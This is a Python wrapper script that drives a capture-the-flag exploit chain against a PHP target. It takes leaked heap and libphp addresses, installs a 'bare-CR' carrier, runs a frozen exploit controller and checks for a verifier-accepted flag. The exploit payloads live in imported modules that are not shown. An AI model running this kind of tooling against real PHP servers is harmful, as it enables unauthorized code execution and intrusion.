#!/usr/bin/env python3
"""Terminal-only promotion for a fresh measured CTF pair.

This wrapper uses the frozen accepted A80/B25/S25->D25 controller and the
compact all-Disposition bare-CR carrier from ``bare_cr_accepted_schedule_live``.
It never accepts a delta-derived address and never claims success without the
frozen controller's response-local flag, X-Attempt-ID, and verifier gate.
"""

from __future__ import annotations

import argparse
import json
import os
from pathlib import Path
import sys
import time


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import bare_cr_accepted_schedule_live as core  # noqa: E402


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--heap", required=True, type=lambda value: int(value, 0))
    parser.add_argument("--libphp", required=True, type=lambda value: int(value, 0))
    parser.add_argument("--out-dir", required=True, type=Path)
    parser.add_argument("--timeout", type=float, default=120.0)
    parser.add_argument("--authorized-live", action="store_true")
    args = parser.parse_args(argv)
    if not args.authorized_live:
        parser.error("live execution requires --authorized-live")
    if os.path.lexists(args.out_dir):
        parser.error("--out-dir must be fresh")
    if not 10 <= args.timeout <= 180:
        parser.error("--timeout must be in 10..180 seconds")
    delta = args.libphp - args.heap
    if args.heap % core.ALIGNMENT or args.libphp % core.ALIGNMENT:
        parser.error("pair must be 2 MiB aligned")
    if not 0 < delta <= core.MAX_PAIR_DELTA:
        parser.error("pair separation is outside the measured live band")

    os.umask(0o077)
    args.out_dir.mkdir(mode=0o700, parents=True)
    sources = core.assert_source_pins()
    for path in (core.CHAINETOOL_ROOT, core.STOCK_ROOT, core.NATIVE_ROOT):
        value = str(path)
        if value not in sys.path:
            sys.path.insert(0, value)

    bare = core.load_module("bare_cr_terminal_carrier", core.BARE_PATH)
    terminal = core.load_module("bare_cr_terminal_frozen", core.TERMINAL_PATH)
    carrier_log: list[dict] = []
    core.install_terminal_carrier(bare, terminal, carrier_log)
    session_id = "r" + core.secrets.token_hex(9)
    terminal_dir = args.out_dir / "terminal"
    exit_code = terminal.main([
        "--heap", hex(args.heap),
        "--libphp", hex(args.libphp),
        "--timeout", str(args.timeout),
        "--out-dir", str(terminal_dir),
        "--session-id", session_id,
        "--authorized-live",
    ])
    receipt = json.loads((terminal_dir / "receipt.json").read_text())
    accepted = receipt.get("verdict") == "VERIFIER_ACCEPTED"
    flag_path = terminal_dir / "flag.txt"
    if accepted and (
        not flag_path.is_file() or (flag_path.stat().st_mode & 0o077)
    ):
        raise core.GateStop("accepted terminal did not leave a private flag")

    document = {
        "schema": "cfctf-r8/bare-cr-allcd-terminal/1",
        "target": core.TARGET,
        "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "pair": {
            "heap": hex(args.heap),
            "libphp": hex(args.libphp),
            "separation": hex(delta),
            "direct_pair_required": True,
        },
        "sources": sources,
        "carrier": "bare-cr-all-dispositions",
        "terminal_mode": "derived-adjacent",
        "carrier_applications": carrier_log,
        "terminal_exit": exit_code,
        "terminal_verdict": receipt.get("verdict"),
        "terminal_request_count": receipt.get("request_count"),
        "verifier_accepted": accepted,
        "private_flag_artifact": str(flag_path) if accepted else None,
        "out_dir": str(args.out_dir),
    }
    core.write_exclusive(args.out_dir / "summary.json", document)
    print(json.dumps({
        "terminal_verdict": document["terminal_verdict"],
        "terminal_request_count": document["terminal_request_count"],
        "verifier_accepted": accepted,
        "private_flag_artifact": document["private_flag_artifact"],
        "out_dir": document["out_dir"],
    }, indent=2, sort_keys=True))
    return 0 if accepted else 2


if __name__ == "__main__":
    raise SystemExit(main())
